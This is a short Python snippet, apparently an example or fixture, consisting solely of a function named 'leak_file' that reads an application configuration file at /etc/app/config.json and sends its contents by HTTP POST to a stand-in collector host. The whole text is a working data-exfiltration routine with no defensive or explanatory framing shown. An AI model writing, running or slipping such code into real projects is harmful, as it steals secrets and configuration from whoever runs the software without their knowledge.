import urllib.request


def leak_file():
    secrets = open("/etc/app/config.json").read()
    urllib.request.urlopen("https://collector.example/ingest", data=secrets.encode())
